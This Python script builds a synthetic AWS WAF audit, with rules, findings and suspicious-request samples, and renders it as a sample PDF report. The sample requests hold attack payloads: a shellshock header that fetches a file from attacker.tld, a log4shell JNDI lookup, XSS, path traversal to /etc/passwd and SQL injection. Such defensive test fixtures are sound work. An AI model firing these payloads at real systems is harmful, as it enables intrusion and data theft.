"""Generate /app/dist/sample-audit.pdf with synthetic Phase-5.5 evidence.

Stand-alone — does not require a running Mongo / OpenAI / AWS. Constructs
an in-memory audit run that includes:
    * One attached Web ACL with 4 real customer rules
    * One orphaned Web ACL (zero attached resources)
    * Findings of every type INCLUDING two bypass_candidate items with
      evidence='log-sample'
    * A populated `suspicious_request_sample` covering the four attack
      classes the spec requires (shellshock, log4shell, XSS, path traversal)

Run:    python scripts/render_sample_pdf.py
Output: /app/dist/sample-audit.pdf
"""
from __future__ import annotations

import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

BACKEND_DIR = Path(__file__).resolve().parent.parent / "backend"
sys.path.insert(0, str(BACKEND_DIR))

from services.pdf_report import render_audit_pdf  # noqa: E402

NOW = datetime.now(timezone.utc)


def _ts(days_ago: int = 0, hours_ago: int = 0) -> str:
    return (NOW - timedelta(days=days_ago, hours=hours_ago)).strftime(
        "%Y-%m-%dT%H:%M:%SZ"
    )


AUDIT_RUN = {
    "_id": "phase5sample00000000000000000001",
    "account_id": "371126261144",  # real account — not masked per user request
    "region": "us-east-1",
    "status": "complete",
    "created_at": NOW - timedelta(minutes=12),
    "started_at": NOW - timedelta(minutes=12),
    "completed_at": NOW - timedelta(minutes=4),
    "web_acl_count": 2,
    "rule_count": 5,
    "log_window_days": 30,
    "estimated_waste_usd": 3.0,
    "estimated_waste_breakdown": [
        {
            "rule_name": "Legacy-IP-Block-2019",
            "monthly_usd": 1.0,
            "reason": "Zero hits in 30 days — origin IPs no longer routable.",
        },
        {
            "rule_name": "Unused-Geo-Block-CN",
            "monthly_usd": 1.0,
            "reason": "Zero hits in 30 days — country block superseded by IP rep list.",
        },
        {
            "rule_name": "Old-Rate-Limit-Probe",
            "monthly_usd": 1.0,
            "reason": "Below activation threshold — never fired in window.",
        },
    ],
    "fms_visibility": True,
    "logging_available": True,
    "data_source": "aws",
    "web_acls": [
        {
            "name": "prod-api-acl",
            "scope": "REGIONAL",
            "arn": "arn:aws:wafv2:us-east-1:371126261144:regional/webacl/prod-api-acl/abc-123",
            "attached_resources": [
                "arn:aws:elasticloadbalancing:us-east-1:371126261144:loadbalancer/app/prod-api/xyz",
            ],
            "attached": True,
        },
        {
            "name": "legacy-marketing-acl",
            "scope": "REGIONAL",
            "arn": "arn:aws:wafv2:us-east-1:371126261144:regional/webacl/legacy-marketing-acl/def-456",
            "attached_resources": [],
            "attached": False,
        },
    ],
    # Phase 5.5 — synthetic evidence that drove the bypass findings below.
    "suspicious_request_sample": [
        {
            "_suspicion_score": 20,
            "action": "ALLOW",
            "responseCodeSent": 200,
            "httpRequest": {
                "uri": "/cgi-bin/contact-form.cgi",
                "args": "",
                "country": "RU",
                "headers": [
                    {
                        "name": "user-agent",
                        "value": '() { :;}; /bin/bash -c "wget http://attacker.tld/x -O /tmp/x"',
                    },
                    {"name": "host", "value": "marketing.example.com"},
                ],
            },
        },
        {
            "_suspicion_score": 14,
            "action": "ALLOW",
            "responseCodeSent": 200,
            "httpRequest": {
                "uri": "/api/v2/login",
                "args": "",
                "country": "CN",
                "headers": [
                    {
                        "name": "x-api-version",
                        "value": "${jndi:ldap://203.0.113.42:1389/Exploit}",
                    },
                    {"name": "user-agent", "value": "Mozilla/5.0"},
                ],
            },
        },
        {
            "_suspicion_score": 12,
            "action": "ALLOW",
            "responseCodeSent": 200,
            "httpRequest": {
                "uri": "/search",
                "args": "q=<script>alert(document.cookie)</script>",
                "country": "US",
                "headers": [
                    {"name": "user-agent", "value": "Mozilla/5.0"},
                ],
            },
        },
        {
            "_suspicion_score": 10,
            "action": "ALLOW",
            "responseCodeSent": 200,
            "httpRequest": {
                "uri": "/static/assets/../../../etc/passwd",
                "args": "",
                "country": "BR",
                "headers": [
                    {"name": "user-agent", "value": "curl/7.88.1"},
                ],
            },
        },
        {
            "_suspicion_score": 8,
            "action": "ALLOW",
            "responseCodeSent": 200,
            "httpRequest": {
                "uri": "/products",
                "args": "id=1+UNION+SELECT+password,user+FROM+admins",
                "country": "DE",
                "headers": [
                    {"name": "user-agent", "value": "sqlmap/1.7.2"},
                ],
            },
        },
    ],
    "seed": False,
}

RULES = [
    {
        "audit_run_id": AUDIT_RUN["_id"],
        "web_acl_name": "prod-api-acl",
        "rule_name": "Block-Known-Bad-IPs",
        "priority": 10,
        "action": "BLOCK",
        "rule_kind": "custom",
        "statement_json": {"IPSetReferenceStatement": {"ARN": "..."}},
        "hit_count": 42_310,
        "last_fired": _ts(hours_ago=2),
        "count_mode_hits": 0,
        "sample_uris": ["/api/v1/login", "/api/v1/checkout"],
        "fms_managed": False,
        "override_action": None,
        "ai_explanation": "Blocks traffic from a curated bad-IP list maintained by the security team.",
        "ai_working": True,
        "ai_concerns": None,
    },
    {
        "audit_run_id": AUDIT_RUN["_id"],
        "web_acl_name": "prod-api-acl",
        "rule_name": "AWSManagedRulesCommonRuleSet",
        "priority": 20,
        "action": "BLOCK",
        "rule_kind": "managed",
        "statement_json": {
            "ManagedRuleGroupStatement": {
                "VendorName": "AWS",
                "Name": "AWSManagedRulesCommonRuleSet",
            }
        },
        "hit_count": 1_204,
        "last_fired": _ts(hours_ago=1),
        "count_mode_hits": 0,
        "sample_uris": ["/api/v1/checkout?id=' OR 1=1--"],
        "fms_managed": True,
        "override_action": "None",
        "ai_explanation": "AWS-maintained OWASP top-10 baseline group. Firing normally.",
        "ai_working": True,
        "ai_concerns": None,
    },
    {
        "audit_run_id": AUDIT_RUN["_id"],
        "web_acl_name": "prod-api-acl",
        "rule_name": "Legacy-IP-Block-2019",
        "priority": 30,
        "action": "BLOCK",
        "rule_kind": "custom",
        "statement_json": {"IPSetReferenceStatement": {"ARN": "..."}},
        "hit_count": 0,
        "last_fired": None,
        "count_mode_hits": 0,
        "sample_uris": [],
        "fms_managed": False,
        "override_action": None,
        "ai_explanation": "Hardcoded IP list from a 2019 incident. Zero hits in 30 days.",
        "ai_working": False,
        "ai_concerns": "Likely safe to remove — IPs are no longer routable.",
    },
    {
        "audit_run_id": AUDIT_RUN["_id"],
        "web_acl_name": "prod-api-acl",
        "rule_name": "Old-Rate-Limit-Probe",
        "priority": 40,
        "action": "BLOCK",
        "rule_kind": "rate_based",
        "statement_json": {"RateBasedStatement": {"Limit": 100000, "AggregateKeyType": "IP"}},
        "hit_count": 0,
        "last_fired": None,
        "count_mode_hits": 0,
        "sample_uris": [],
        "fms_managed": False,
        "override_action": None,
        "ai_explanation": "Threshold set very high (100k/5min). Never triggered.",
        "ai_working": False,
        "ai_concerns": "Threshold likely unrealistic — investigate.",
    },
    {
        "audit_run_id": AUDIT_RUN["_id"],
        "web_acl_name": "legacy-marketing-acl",
        "rule_name": "Unused-Geo-Block-CN",
        "priority": 10,
        "action": "BLOCK",
        "rule_kind": "custom",
        "statement_json": {"GeoMatchStatement": {"CountryCodes": ["CN"]}},
        "hit_count": 0,
        "last_fired": None,
        "count_mode_hits": 0,
        "sample_uris": [],
        "fms_managed": False,
        "override_action": None,
        "ai_explanation": "Geo block on country code CN. ACL is orphaned — rule is dormant.",
        "ai_working": False,
        "ai_concerns": None,
    },
]

FINDINGS = [
    {
        "audit_run_id": AUDIT_RUN["_id"],
        "type": "bypass_candidate",
        "severity": "high",
        "title": "Possible WAF bypass: shellshock reached origin",
        "description": (
            "An HTTP request containing a shellshock payload "
            "('() { :;}; /bin/bash -c ...') in the User-Agent header was "
            "served 200 OK by the origin. Sample URI: /cgi-bin/contact-form.cgi."
        ),
        "recommendation": (
            "Enable AWSManagedRulesKnownBadInputsRuleSet on prod-api-acl, or "
            "add a custom BLOCK rule matching the literal '() { :;}' string "
            "in any header value."
        ),
        "affected_rules": [],
        "confidence": 0.95,
        "severity_score": 95,
        "evidence": "log-sample",
        "created_at": NOW,
    },
    {
        "audit_run_id": AUDIT_RUN["_id"],
        "type": "bypass_candidate",
        "severity": "high",
        "title": "Possible WAF bypass: log4shell reached origin",
        "description": (
            "An HTTP request with a JNDI / log4shell payload "
            "('${jndi:ldap://...}') in the x-api-version header was served "
            "200 OK by the origin. Sample URI: /api/v2/login."
        ),
        "recommendation": (
            "Enable AWSManagedRulesKnownBadInputsRuleSet. Audit the upstream "
            "service for vulnerable log4j/2 dependency exposure."
        ),
        "affected_rules": [],
        "confidence": 0.92,
        "severity_score": 92,
        "evidence": "log-sample",
        "created_at": NOW,
    },
    {
        "audit_run_id": AUDIT_RUN["_id"],
        "type": "dead_rule",
        "severity": "high",
        "title": "Legacy IP block has not fired in 30 days",
        "description": "Legacy-IP-Block-2019 hit count is 0 over the audit window.",
        "recommendation": (
            "Verify the IP set still contains routable addresses; if not, "
            "delete the rule to recover the $1/month rule fee and reduce "
            "ACL complexity."
        ),
        "affected_rules": ["Legacy-IP-Block-2019"],
        "confidence": 0.9,
        "severity_score": 90,
        "evidence": None,
        "created_at": NOW,
    },
    {
        "audit_run_id": AUDIT_RUN["_id"],
        "type": "bypass_candidate",
        "severity": "medium",
        "title": "Rate-limit threshold likely unreachable",
        "description": (
            "Old-Rate-Limit-Probe is configured at 100k requests / 5min — "
            "no real traffic source comes close to this. The rule provides "
            "no practical protection."
        ),
        "recommendation": (
            "Lower the threshold to a value reflective of actual abuse "
            "patterns (typically 100-2000 req/5min per IP for APIs)."
        ),
        "affected_rules": ["Old-Rate-Limit-Probe"],
        "confidence": 0.7,
        "severity_score": 60,
        "evidence": None,
        "created_at": NOW,
    },
    {
        "audit_run_id": AUDIT_RUN["_id"],
        "type": "quick_win",
        "severity": "low",
        "title": "Duplicate Geo block is dormant",
        "description": "Unused-Geo-Block-CN duplicates protection already provided by AWS IP-reputation list on prod ACL.",
        "recommendation": "Delete after confirming no business case requires explicit CN block.",
        "affected_rules": ["Unused-Geo-Block-CN"],
        "confidence": 0.65,
        "severity_score": 35,
        "evidence": None,
        "created_at": NOW,
    },
    {
        "audit_run_id": AUDIT_RUN["_id"],
        "type": "fms_review",
        "severity": "low",
        "title": "AWS managed common rule set — verify scope",
        "description": (
            "AWSManagedRulesCommonRuleSet is FMS-managed. Hit volume "
            "consistent with normal OWASP-class probing."
        ),
        "recommendation": (
            "Flag for review with the central security team if scope changes "
            "are required — customer cannot modify FMS-managed rules directly."
        ),
        "affected_rules": ["AWSManagedRulesCommonRuleSet"],
        "confidence": 0.85,
        "severity_score": 25,
        "evidence": None,
        "created_at": NOW,
    },
    {
        "audit_run_id": AUDIT_RUN["_id"],
        "type": "orphaned_web_acl",
        "severity": "low",
        "title": "Web ACL 'legacy-marketing-acl' is not attached to any resource",
        "description": (
            "This REGIONAL Web ACL has zero associated resources (ALB / API "
            "Gateway / AppSync / CloudFront). All its rules are dormant by "
            "definition."
        ),
        "recommendation": (
            "Either attach the ACL to an in-use resource or delete it. Web "
            "ACLs incur a fixed monthly fee regardless of traffic."
        ),
        "affected_rules": ["Unused-Geo-Block-CN"],
        "confidence": 1.0,
        "severity_score": 30,
        "evidence": None,
        "created_at": NOW,
    },
]


def main():
    pdf_bytes = render_audit_pdf(AUDIT_RUN, RULES, FINDINGS)
    out_path = Path("/app/dist/sample-audit.pdf")
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(pdf_bytes)
    print(f"Wrote {out_path} ({len(pdf_bytes)} bytes)")


if __name__ == "__main__":
    main()
